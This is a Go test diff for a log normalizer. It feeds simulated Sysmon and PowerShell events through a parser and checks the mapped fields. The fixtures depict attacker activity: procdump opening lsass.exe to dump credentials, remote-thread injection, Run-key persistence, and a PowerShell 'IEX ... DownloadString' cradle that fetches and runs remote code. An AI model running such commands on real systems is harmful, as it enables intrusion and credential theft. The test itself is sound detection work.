@@ -216,3 +216,49 @@ func TestGuessYear(t *testing.T) {
 		}
 	}
 }
+
+func TestSysmonEventTypes(t *testing.T) {
+	sysmon := func(id int, lines ...string) map[string]any {
+		b, _ := json.Marshal(map[string]any{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS1", "EventID": id,
+			"Message": strings.Join(lines, "\r\n")})
+		return Normalize("win.sysmon", decode(t, string(b)), now).Document()
+	}
+	expect(t, sysmon(7, "Image loaded:", `Image: C:\Users\bob\app.exe`, "ProcessId: 4242", `ImageLoaded: C:\Users\bob\evil.dll`,
+		"Description: Evil", "Signed: false", "Signature: -", "SignatureStatus: Unavailable", `User: CORP\bob`), map[string]any{
+		"datamodel": "Image_Load", "process_name": "app.exe", "loaded_file_path": `C:\Users\bob\evil.dll`, "loaded_file_name": "evil.dll",
+		"signed": "false", "signature_status": "Unavailable", "process_id": int64(4242), "user": `CORP\bob`,
+	})
+	expect(t, sysmon(10, "Process accessed:", `SourceImage: C:\Tools\procdump.exe`, "SourceProcessId: 77", `TargetImage: C:\Windows\system32\lsass.exe`,
+		"TargetProcessId: 640", "GrantedAccess: 0x1410", `CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9d4c4|UNKNOWN(00007FFB)`, `SourceUser: CORP\bob`), map[string]any{
+		"datamodel": "Endpoint", "signature": "Process accessed", "process_name": "procdump.exe", "target_process_name": "lsass.exe",
+		"target_process_id": int64(640), "granted_access": "0x1410", "call_trace": `C:\Windows\SYSTEM32\ntdll.dll+9d4c4|UNKNOWN(00007FFB)`,
+	})
+	expect(t, sysmon(8, "CreateRemoteThread detected:", `SourceImage: C:\Tools\inject.exe`, `TargetImage: C:\Windows\explorer.exe`,
+		"StartAddress: 0x00000000025D0000", "StartModule: -", "StartFunction: -"), map[string]any{
+		"datamodel": "Endpoint", "signature": "Remote thread created", "target_process_path": `C:\Windows\explorer.exe`, "start_address": "0x00000000025D0000",
+	})
+	expect(t, sysmon(11, "File created:", `Image: C:\Windows\System32\cmd.exe`, `TargetFilename: C:\Users\bob\AppData\Roaming\run.vbs`), map[string]any{
+		"datamodel": "Filesystem", "action": "created", "file_name": "run.vbs", "process_name": "cmd.exe",
+	})
+	expect(t, sysmon(23, "File Delete archived:", `Image: C:\x.exe`, `TargetFilename: C:\logs\a.log`, "Hashes: SHA256=ABCD"), map[string]any{
+		"datamodel": "Filesystem", "action": "deleted", "file_path": `C:\logs\a.log`, "file_hash": "abcd",
+	})
+	expect(t, sysmon(13, "Registry value set:", "EventType: SetValue", `Image: C:\x.exe`,
+		`TargetObject: HKU\S-1-5-21\Software\Microsoft\Windows\CurrentVersion\Run\Updater`, `Details: C:\Users\bob\u.exe`), map[string]any{
+		"datamodel": "Registry", "action": "modified", "registry_value_name": "Updater", "registry_key_name": "Run",
+		"registry_value_data": `C:\Users\bob\u.exe`,
+	})
+	expect(t, sysmon(12, "Registry object added or deleted:", "EventType: CreateKey", `TargetObject: HKLM\System\CurrentControlSet\Services\Evil`), map[string]any{
+		"datamodel": "Registry", "action": "created", "registry_key_name": "Evil",
+	})
+	expect(t, sysmon(22, "Dns query:", `Image: C:\x.exe`, "QueryName: bad.example", "QueryStatus: 9003", "QueryResults: -"), map[string]any{
+		"datamodel": "Network_Resolution", "query": "bad.example", "reply_code": "NXDomain", "process_name": "x.exe",
+	})
+
+	b, _ := json.Marshal(map[string]any{"Channel": "Microsoft-Windows-PowerShell/Operational", "Computer": "WS1", "EventID": "4104",
+		"StringInserts": []string{"2", "3", "IEX (New-Object Net.WebClient).DownloadString('http://x')", "{5d1b4c2e-0d3a-4b8e-9c71-2a5d8e4f9b10}", ""}})
+	expect(t, Normalize("win.powershell", decode(t, string(b)), now).Document(), map[string]any{
+		"datamodel": "Script", "script_block_text": "IEX (New-Object Net.WebClient).DownloadString('http://x')",
+		"script_block_id": "5d1b4c2e-0d3a-4b8e-9c71-2a5d8e4f9b10", "script_part": int64(2), "script_parts": int64(3),
+	})
+}
